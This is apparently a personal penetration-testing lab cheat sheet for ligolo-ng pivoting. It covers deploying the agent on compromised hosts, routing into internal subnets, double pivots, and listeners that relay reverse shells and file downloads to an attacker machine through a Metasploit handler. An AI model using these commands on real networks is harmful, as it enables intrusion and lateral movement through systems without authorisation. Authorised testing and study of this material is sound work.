


run ligolo agent (on  target)
```
./agent -connect 10.10.16.x:11601 -ignore-cert

# SSH remote agent execute command:
ssh -i root_key root@10.129.210.166 "nohup ./agent -connect 10.10.16.X:11601 -ignore-cert > /dev/null 2>&1 &
```

2. start route
```
session root@dmz01
autoroute
pick the ip that belongs to desired subnet
```
start port forward  for file transfers:
```
listener_add --addr 0.0.0.0:1337 --to 10.10.X.X:1337 --tcp
```
start port forward for reverse shell connections:
```
listener_add --addr 0.0.0.0:8443 --to 10.10.X.X:8443 --tcp
```

 if it bugs out try to change port on attacker to 1338
 
 delete listener
```

listener_del
```
change port to 1338
```
# listener_add --addr 0.0.0.0:1337 --to 10.10.X.X:1338
```

JUST USE AUTOROUTE


----------------
# Preparation

start with a map  of hosts that you can build upon using eraser.io or draw.io......

## Manual Routing to internal network

```
sudo ip tuntap add user demise mode tun ligolo
 sudo ip link set ligolo up

```
`create a network interface for ligolo (tunnel interface)`
```
sudo ip tuntap add user [demise] mode  tun ligolo
sudo ip link set ligolo up
```

`verify interface exists`
```
ip addr show ligolo
```
fix for file already exists when reestablishing connections (after it dies)
```
sudo ip show routes
sudo ip route del <172.16.0.0/23>
```


Setting up the ligolo-ng Proxy server (as an attacker)`
```
ligolo-proxy [-autocert -auto-cert -selfcert] 0.0.0.0:11601
# in realworld use -autocert 
# in lab environment use -selfcert
```

transfer ligolo agent to target
```
#with password PROMPT
scp packed_agent root@10.129.43.243:/root/agent 

# with key:
scp -i root_private_key packed_agent  root@10.129.43.243:/root/agent

scp -i <priv-key-path OR password> packed_agent  root@10.129.229.147:/root/agent
```

run ligolo agent (on  target)
```
./agent -connect 10.10.16.x:11601 -ignore-cert
```

type `session` and specify the target with `1`
### Routing to internal network
lets start adding a route  to the internal network using  the `Autorouting` functionality provided 
`view routing configs`
```
ifconfig
```

You will now see at the bottom a new  interface for the `lan` that the pivot host is connected to, confirming access to the internal network.

` manually adding route to the new interface (pivot's internal network nic)`
```
sudo ip route  add 172.16.x.0/24 dev ligolo
```

`start the tunnel`
```
ligolo> start
```



# Local Port forwarding (Accessing local ports)

if the host is running local services we can access them with `240.0.0.1
```
attcker$ sudo ip route add 240.0.0.1/32 dev ligolo
```

detect machine's local services
```
attcker$ nmap 240.0.0.1
```
## Remote Port forwarding

`start a listener on agent1`
```



```
any network coming to pivot1's 30000 port will get forwarded to (kali 127.xx:10000)
this whole command says:
`forward traffic coming to jumphost1's port 30000 from any ip to attacker's ip  which they can access via localhost:10000`


https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2
start server and agent
select session
do ifconfig and notice the new internal interface
add new route
example
https://excalidraw.com/

#### troubleshooting

1. delete problematic routes /interfaces
```
route_del #selective menu
# manual
route_del --name perfectelectro --route 172.16.0.0/16
```



---

![[Pasted image 20250705163258.png| 700]]
```
agent connect
```
![[Pasted image 20250705164031.png]]
add route to internal network
```
sudo ip route add 10.10.8.0/24 dev ligolo
```

	KALI ->HOST1
	
add  a new host to tunnel
`create interface`
```
sudo tuntap  add user kali  mode tun  ligolo-double 
sudo ip link set ligolo-pivot1 up
```
### Forwarding Traffic from pivot host to attacker

### step 1: add two port forwards: 

1. from downloading files off your http server on victim eg: `1337` to connect to your http server hosting at 8000
```
python3 -m http.server 8000
```
start forwarding to attacker server's 8000 port
```
listener_add --addr 0.0.0.0:1337 --to 10.10.16.42:8000 --tcp 
```
2. add a secondary listener to forward reverse shell/ tools traffic
```
listener_add --addr 0.0.0.0:1338 --to 10.10.16.42:8001 --tcp 
```
now you can run the reverse shell tool by pointing it to to the pivot host at port `1338`
## Double Pivot
```
<jumphost1» listener_add --addr <jumphost1-ip-internal>:11601 --to 10.10.16.42:11601 --tcp
```
example:
`<jumphost1» listener_add --addr <172.16.8.120>:11601 --to 10.10.16.42:11601 --tcp`

on the target machine
```
./agent.exe -connect <jumphost1-ip-internal>:11601 -ignore-cert
```

add a listener to forward tunnel traffic through pivot host.
`host 2` -> `pivot host` -> `attacker` `(11601)`
`forward incoming 11601 to my connected 11601 (attker)`
```
listener_add --addr 0.0.0.0:11601 --to 10.10.16.X:11601 --tcp 
```
if it fails try this:
```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp 
```

`jumphost2 connec to jumphost1`
```
ligolo-agent.exe -connect 172.16.8.20:11601 -ignore-cert
```

select the session
![[Pasted image 20250705165151.png]]
check  the new  NIC
```
ifconfig
```
start the tunnel
```
tunnel start --tun ligolo-double
```
add a route to the third network to make it via the ligolo-double IF
```
sudo ip route add 172.16.3.0/24 dev ligolo-double
```

with session of pivot2 host start the tunnel
```
[Agent PIVOT-SRV02 ]tunnel_start --tun ligolo-double
```

if u get an error run this
```
sudo ip link delete ligolo-double
```

check listeners
```
listener_list
```

# File Transfers

```
[Agent : ubuntu@darkside] » listener_add --addr 0.0.0.0:2000 --to 0.0.0.0:31337

 python3 -m http.server 31337
Serving HTTP on 0.0.0.0 port 31337 (http://0.0.0.0:31337/) ...
```

```
iwr -uri http://pivot1IP:2000/agent.exe -Outfile C:\Users\Public\agent.exe
```
![[Pasted image 20250705170217.png]]

---
## workaround for AEN failing pivot to mgmt host
### Reverse Shells and meterpreter
![[Pasted image 20250705170536.png]]
```
LIGOLO pivot1@ubuntu>$ listener_add -addr 0.0.0.0:1111 --to 0.0.0.0:4444
```

```
msfconsole -q 
use multi/handler

set lport 4444 
set lhost 0.0.0.0
```

` on Compromised DC01`
```
C:\>    .\agent.exe -connect 10.10.8.9:1111 -ignore-cert
```
![[Pasted image 20250705171025.png]]
## Moving files, catching reverse shell

moving files or catching reverse shells require setting up listeners on different ports and port forwarding the traffic for each use case
ligolo keeps a list of redirections 
```
listener_list
```
![[Pasted image 20250705171833.png]]
# verify connection 

`test if pivot works with nmap`
if its working you get open 
if its not nmap shows filtered 

## Multiple pivots
![[Pasted image 20250705163258.png| 700]]
`connect to pivot1 from pivot2`
```

```

`test if pivot works with nmap`
if its working you get open 
if its not nmap shows filtered 

`add nic for a newer pivot host`

` add a route to new network via new host`


# a fix  for certificate not found

 You can generate a TLS certificate for Ligolo manually using `openssl`. This is useful when:

 Generate TLS Certificate for Ligolo
`mkdir cers`
`cd certs`
```
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365 \
-subj "/CN=ligolo"
```

```
$ sudo ./proxy -laddr 0.0.0.0:11601 -certfile certs/cert.pem -keyfile certs/key.pem
              
```


```
create interface
ip tuntap
run proxy
connect to proxy from agent
add route with sudo ip route add ip/cidr <ligolo>
172.16.5.0      0.0.0.0         255.255.255.0   U     0      0        0 ligolo

```